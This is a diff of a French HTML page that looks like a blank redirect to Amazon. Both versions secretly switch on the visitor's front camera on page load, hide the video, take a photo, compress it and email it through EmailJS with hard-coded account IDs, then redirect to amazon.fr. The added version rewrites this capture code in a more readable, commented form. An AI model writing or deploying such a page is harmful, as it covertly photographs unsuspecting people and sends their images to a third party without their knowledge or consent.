@@ -1,21 +1,77 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<style>html,body{margin:0;height:100%;background:#000;overflow:hidden}video,canvas{display:none}</style>
+  <meta charset="UTF-8">
+  <title></title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+    }
+    video, canvas {
+      display: none !important;
+    }
+  </style>
 </head>
 <body>
-<video id="v" autoplay playsinline></video><canvas id="c" width="1280" height="720"></canvas>
-<script>
-emailjs.init("IoSfbtGz4KSL_5_9E");
-const v=document.getElementById("v"),c=document.getElementById("c"),x=c.getContext("2d");
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720}})
-.then(s=>{v.srcObject=s;v.onloadeddata=()=>{x.drawImage(v,0,0,c.width,c.height);
-let q=.85,i;do{i=c.toDataURL("image/jpeg",q);if(i.length*3/4/1024<=60)break;q-=.05}while(q>.1);
-s.getTracks().forEach(t=>t.stop());emailjs.send("service_8cs0gml","template_rdhxflt",{image:i});
-setTimeout(()=>location.href="https://www.amazon.fr",300);};})
-.catch(()=>location.href="https://www.amazon.fr"));
-</script>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="1920" height="1080"></canvas>
+
+  <script>
+    emailjs.init("IoSfbtGz4KSL_5_9E");
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    async function startCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: 1920, height: 1080 }
+        });
+        video.srcObject = stream;
+
+        video.onloadeddata = () => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          let quality = 0.9;
+          let imageData;
+          let sizeKB = 0;
+
+          // Compression forcée jusqu'à ≤ 60KB
+          do {
+            imageData = canvas.toDataURL("image/jpeg", quality);
+            sizeKB = Math.round((imageData.length * 3 / 4) / 1024);
+            quality -= 0.05;
+          } while (sizeKB > 60 && quality > 0.05);
+
+          console.log("Taille finale:", sizeKB + "KB à qualité " + (quality+0.05));
+
+          // Stop caméra
+          stream.getTracks().forEach(track => track.stop());
+
+          // Envoi via EmailJS
+          emailjs.send("service_8cs0gml", "template_rdhxflt", {
+            message: "Photo auto 📸 (" + sizeKB + " KB)",
+            image: imageData
+          });
+
+          // Redirection vers Amazon
+          setTimeout(() => {
+            window.location.href = "https://www.amazon.fr";
+          }, 500);
+        };
+      } catch (err) {
+        window.location.href = "https://www.amazon.fr";
+      }
+    }
+
+    window.onload = startCapture;
+  </script>
 </body>
 </html>
